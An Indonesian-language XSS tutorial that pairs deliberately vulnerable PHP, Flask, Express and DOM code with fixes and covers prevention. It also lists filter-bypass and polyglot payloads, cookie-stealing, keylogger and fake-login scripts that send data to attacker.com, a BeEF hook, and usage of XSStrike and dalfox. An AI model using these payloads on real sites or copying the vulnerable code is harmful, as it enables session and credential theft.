# Cross-Site Scripting (XSS)

## Pengertian

Cross-Site Scripting (XSS) adalah jenis serangan terhadap aplikasi web yang memungkinkan penyerang menyisipkan skrip berbahaya ke dalam halaman web yang dilihat oleh pengguna lain. Skrip ini biasanya berupa JavaScript dan digunakan untuk mencuri informasi, melakukan pengalihan, atau memanipulasi tampilan halaman web.

**Analogi:** Bayangkan sebuah papan pengumuman di mana siapa pun dapat menempelkan catatan. Jika seseorang menempelkan catatan yang berisi instruksi palsu ("Serahkan dokumen Anda kepada saya"), dan orang lain mempercayainya, maka informasi dapat dicuri. XSS bekerja dengan cara yang sama -- menyisipkan instruksi palsu ke halaman web yang dipercaya pengguna.

## Contoh Source Code yang Rentan XSS

### 1. PHP - Reflected XSS

**Kode Rentan:**
```php
<?php
// BAHAYA: Input pengguna langsung ditampilkan tanpa escaping
$search = $_GET['search'];
echo "<p>Hasil pencarian untuk: " . $search . "</p>";
?>

<form method="GET">
    <input type="text" name="search" placeholder="Cari...">
    <input type="submit" value="Cari">
</form>
```

**Kode Aman:**
```php
<?php
// AMAN: Escape output sebelum ditampilkan
$search = $_GET['search'] ?? '';
echo "<p>Hasil pencarian untuk: " . htmlspecialchars($search, ENT_QUOTES, 'UTF-8') . "</p>";
?>
```

### 2. Python (Flask) - Reflected XSS

**Kode Rentan:**
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    # BAHAYA: Input pengguna langsung ditampilkan tanpa escaping
    return f"<p>Hasil pencarian untuk: {keyword}</p>"

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request, escape

app = Flask(__name__)

@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    # AMAN: Escape input sebelum ditampilkan
    return f"<p>Hasil pencarian untuk: {escape(keyword)}</p>"

if __name__ == "__main__":
    app.run(debug=True)
```

### 3. Node.js (Express) - Stored XSS

**Kode Rentan:**
```javascript
const express = require('express');
const app = express();

let comments = [];

app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    // BAHAYA: Menyimpan input pengguna tanpa validasi
    comments.push(comment);
    res.send('Comment added');
});

app.get('/comments', (req, res) => {
    // BAHAYA: Menampilkan komentar tanpa escaping
    let html = '<h1>Komentar:</h1><ul>';
    comments.forEach(c => {
        html += `<li>${c}</li>`;
    });
    html += '</ul>';
    res.send(html);
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const app = express();

// Gunakan template engine yang auto-escape
app.set('view engine', 'ejs');

let comments = [];

app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    // AMAN: Validasi input
    if (typeof comment !== 'string' || comment.length > 500) {
        return res.status(400).send('Invalid comment');
    }
    comments.push(comment);
    res.send('Comment added');
});

app.get('/comments', (req, res) => {
    // AMAN: Template engine (EJS) akan auto-escape
    res.render('comments', { comments: comments });
});

app.listen(3000);
```

### 4. JavaScript - DOM-based XSS

**Kode Rentan:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Profile</title>
</head>
<body>
    <h1>Welcome, <span id="username"></span></h1>
    
    <script>
        // BAHAYA: Menggunakan innerHTML dengan input dari URL
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        document.getElementById('username').innerHTML = name;
    </script>
</body>
</html>
```

**Kode Aman:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Profile</title>
</head>
<body>
    <h1>Welcome, <span id="username"></span></h1>
    
    <script>
        // AMAN: Gunakan textContent daripada innerHTML
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        document.getElementById('username').textContent = name;
    </script>
</body>
</html>
```

## Tujuan Serangan

XSS dapat digunakan untuk:

- **Pencurian Cookie** -- Mengambil cookie sesi login pengguna dan mengirimkannya ke server penyerang
- **Phishing** -- Menampilkan formulir login palsu untuk mencuri kredensial
- **Modifikasi Konten** -- Mengubah tampilan atau konten halaman web
- **Penyebaran Malware** -- Mengarahkan pengguna ke halaman yang mengunduh perangkat lunak berbahaya
- **Defacement** -- Mengubah tampilan situs web untuk tujuan vandalisme

## Jenis-jenis XSS

### 1. Stored XSS (Persistent)

Payload XSS disimpan di server, misalnya dalam database komentar atau forum. Setiap kali pengguna membuka halaman yang berisi payload tersebut, skrip akan dijalankan.

**Contoh:** Penyerang menulis komentar berisi skrip JavaScript di forum. Setiap pengguna yang membuka thread forum tersebut akan menjalankan skrip penyerang.

**Alur serangan:**
```
1. Penyerang mengirim komentar: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
2. Komentar disimpan di database
3. Pengguna lain membuka halaman komentar
4. Skrip dijalankan di browser pengguna
5. Cookie dikirim ke server penyerang
```

### 2. Reflected XSS (Non-persistent)

Payload berasal dari parameter URL atau formulir dan dieksekusi saat halaman dirender. Skrip tidak disimpan di server, tetapi "dipantulkan" kembali ke pengguna.

**Contoh:** Penyerang membuat tautan berisi payload XSS dan mengirimkannya ke korban melalui email. Ketika korban mengklik tautan tersebut, skrip dijalankan.

**Alur serangan:**
```
1. Penyerang membuat URL: http://target.com/search?q=<script>alert('XSS')</script>
2. URL dikirim ke korban via email
3. Korban mengklik URL
4. Server memproses: echo "Hasil: " . $_GET['q']
5. Skrip dijalankan di browser korban
```

### 3. DOM-based XSS

Skrip dieksekusi di sisi klien (browser) akibat manipulasi Document Object Model (DOM) oleh JavaScript. Payload tidak pernah dikirim ke server, hanya diproses di browser.

**Contoh:** JavaScript mengambil nilai dari URL (`document.location`) dan langsung menampilkannya di halaman tanpa validasi.

**Alur serangan:**
```
1. URL: http://target.com/page?name=<script>alert('XSS')</script>
2. JavaScript di browser membaca parameter URL
3. JavaScript menulis ke DOM: document.getElementById('name').innerHTML = params.get('name')
4. Skrip dijalankan di browser
5. Server tidak pernah melihat payload XSS
```

## Lokasi Kerentanan

XSS sering ditemukan pada:

- Input formulir tanpa validasi atau pembersihan
- Parameter URL
- Kolom komentar atau chat
- Fitur pencarian
- Panel admin yang tidak menerapkan filter
- JavaScript yang mengambil nilai dari `document.location`, `document.cookie`, `innerHTML`, dan fungsi serupa

## Kumpulan Payload XSS

### Payload Dasar

Payload ini digunakan untuk mengidentifikasi apakah aplikasi rentan XSS:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
```

### Payload Bypass Filter

**Jika `<script>` difilter:**
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
<video onloadstart=alert('XSS')>
<audio onplay=alert('XSS')>
```

**Jika spasi difilter:**
```html
<img/src=x/onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body/onload=alert('XSS')>
```

**Jika tanda kutip difilter:**
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(`XSS`)>
```

**Jika kurung difilter:**
```html
<img src=x onerror=alert`XSS`>
<svg/onload=window.alert`XSS`>
```

**Jika `alert` difilter:**
```html
<img src=x onerror=confirm('XSS')>
<img src=x onerror=prompt('XSS')>
<img src=x onerror=console.log('XSS')>
<img src=x onerror=document.location='http://attacker.com/?c='+document.cookie>
```

### Payload untuk Pencurian Cookie

**Mengirim cookie ke server penyerang:**
```html
<script>
    document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>

<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">

<script>
    new Image().src='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

**Mengirim cookie dengan XMLHttpRequest:**
```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/steal', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('cookie=' + document.cookie);
</script>
```

### Payload untuk Keylogger

**Mencatat input keyboard:**
```html
<script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log?key=' + e.key);
    }
</script>
```

### Payload untuk Phishing

**Menampilkan formulir login palsu:**
```html
<script>
    document.body.innerHTML = `
        <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
            <h2>Sesi Anda telah berakhir. Silakan login kembali.</h2>
            <form action="http://attacker.com/steal" method="POST">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </div>
    `;
</script>
```

### Payload untuk Redirect

**Mengalihkan pengguna:**
```html
<script>
    document.location = 'http://attacker.com';
</script>

<script>
    window.location.href = 'http://attacker.com';
</script>

<meta http-equiv="refresh" content="0;url=http://attacker.com">
```

### Payload DOM-based XSS

**Memanipulasi DOM:**
```html
-- Melalui URL
http://target.com/page?name=<img src=x onerror=alert('XSS')>

-- Melalui hash URL
http://target.com/page#<img src=x onerror=alert('XSS')>

-- Melalui document.referrer
<img src=x onerror="document.location='http://attacker.com/?r='+document.referrer">
```

### Payload Polyglot XSS

**Payload yang bekerja di berbagai konteks:**
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e

-- Versi lebih pendek
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Payload untuk Konteks Berbeda

**Di dalam atribut HTML:**
```html
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
" autofocus onfocus="alert('XSS')
```

**Di dalam JavaScript:**
```html
'; alert('XSS');//
</script><script>alert('XSS')</script>
```

**Di dalam CSS:**
```html
<style>body{background:url(javascript:alert('XSS'))}</style>
```

**Di dalam URL:**
```html
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## Tools untuk Pengujian XSS

### 1. Burp Suite

Burp Suite dapat digunakan untuk pengujian XSS secara manual:

- **Intruder** -- Mengirim berbagai payload secara otomatis
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi XSS secara otomatis

**Payload list untuk Intruder:**
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onfocus='alert('XSS')
```

### 2. XSStrike

XSStrike adalah alat otomatis untuk mendeteksi dan mengeksploitasi XSS.

**Instalasi:**
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**Penggunaan:**
```bash
-- Deteksi XSS
python xsstrike.py -u 'http://target.com/search?q=test'

-- Menggunakan cookie
python xsstrike.py -u 'http://target.com/search?q=test' --cookie='session=xyz'

-- Menggunakan data POST
python xsstrike.py -u 'http://target.com/search' --data='q=test'

-- Mode interaktif
python xsstrike.py -u 'http://target.com/search?q=test' --fuzzer
```

### 3. dalfox

dalfox adalah alat pengujian XSS berbasis Go yang cepat.

**Instalasi:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Penggunaan:**
```bash
-- Deteksi XSS
dalfox url 'http://target.com/search?q=test'

-- Menggunakan pipe dari tool lain
cat urls.txt | dalfox pipe

-- Menggunakan cookie
dalfox url 'http://target.com/search?q=test' --cookie='session=xyz'
```

### 4. OWASP ZAP

OWASP ZAP memiliki fitur untuk mendeteksi XSS:

- **Active Scan** -- Otomatis mendeteksi XSS vulnerabilities
- **Fuzzer** -- Mengirim berbagai payload untuk menguji kerentanan

### 5. PayloadsAllTheThings

Repositori lengkap berisi payload XSS:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

### 6. BeEF (Browser Exploitation Framework)

BeEF adalah alat untuk eksploitasi XSS lanjutan.

**Instalasi:**
```bash
git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef
```

**Penggunaan:**
```
1. Inject hook BeEF ke halaman via XSS
<script src="http://attacker.com:3000/hook.js"></script>

2. Browser korban akan terhubung ke BeEF
3. Kontrol browser korban dari dashboard BeEF
4. Lakukan berbagai aksi: redirect, phishing, scan network, dll
```

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan XSS:

1. **Uji dengan payload dasar** -- Input `<script>alert('XSS')</script>` dan perhatikan apakah skrip dijalankan
2. **Uji berbagai konteks** -- Coba di dalam tag HTML, atribut, JavaScript, CSS
3. **Perhatikan filtering** -- Jika payload diblokir, coba bypass dengan encoding atau tag lain
4. **Uji DOM-based XSS** -- Periksa JavaScript yang menggunakan `innerHTML`, `document.write`, `eval`
5. **Gunakan alat otomatis** -- Gunakan XSStrike, dalfox, atau Burp Scanner untuk pengujian menyeluruh

## Metode Pencegahan

1. **Escape output** -- Encode karakter khusus HTML sebelum menampilkan data dari pengguna
   
   ```php
   // PHP
   echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
   ```
   
   ```python
   # Python (Flask)
   from markupsafe import escape
   return escape(user_input)
   ```
   
   ```javascript
   // JavaScript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.textContent = text;
       return div.innerHTML;
   }
   ```

2. **Validasi input** -- Terapkan validasi ketat pada semua input pengguna. Gunakan whitelist untuk nilai yang diharapkan
   
   ```python
   # Hanya izinkan alphanumeric
   import re
   if not re.match(r'^[a-zA-Z0-9]+$', user_input):
       return "Invalid input", 400
   ```

3. **Gunakan Content Security Policy (CSP)** -- CSP membatasi sumber skrip yang dapat dijalankan di halaman web
   
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
   ```
   
   Atau via header HTTP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Hindari penggunaan innerHTML** -- Gunakan `textContent` atau `innerText` daripada `innerHTML` saat menyisipkan data dari pengguna
   
   ```javascript
   // Daripada:
   element.innerHTML = userInput;
   
   // Gunakan:
   element.textContent = userInput;
   ```

5. **Gunakan library templating yang aman** -- Library seperti React, Vue, atau Angular secara otomatis meng-escape output
   
   ```javascript
   // React (auto-escape)
   function Welcome(props) {
       return <h1>Hello, {props.name}</h1>;
   }
   ```

6. **Terapkan HttpOnly pada Cookie** -- Flag HttpOnly mencegah cookie diakses melalui JavaScript, mengurangi dampak pencurian cookie
   
   ```php
   setcookie("session", $session_id, [
       'httponly' => true,
       'secure' => true,
       'samesite' => 'Strict'
   ]);
   ```

7. **Sanitasi HTML** -- Jika harus menerima HTML dari pengguna, gunakan library sanitasi seperti DOMPurify
   
   ```javascript
   // DOMPurify
   const clean = DOMPurify.sanitize(dirty);
   element.innerHTML = clean;
   ```

## Latihan Praktis

Silakan lanjutkan ke direktori latihan untuk eksplorasi lebih lanjut.

## Referensi Lanjutan

- OWASP Cross-Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- Content Security Policy (CSP): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- PortSwigger: Cross-Site Scripting (XSS) -- https://portswigger.net/web-security/cross-site-scripting
- PayloadsAllTheThings XSS -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- XSStrike -- https://github.com/s0md3v/XSStrike
- BeEF -- https://github.com/beefproject/beef
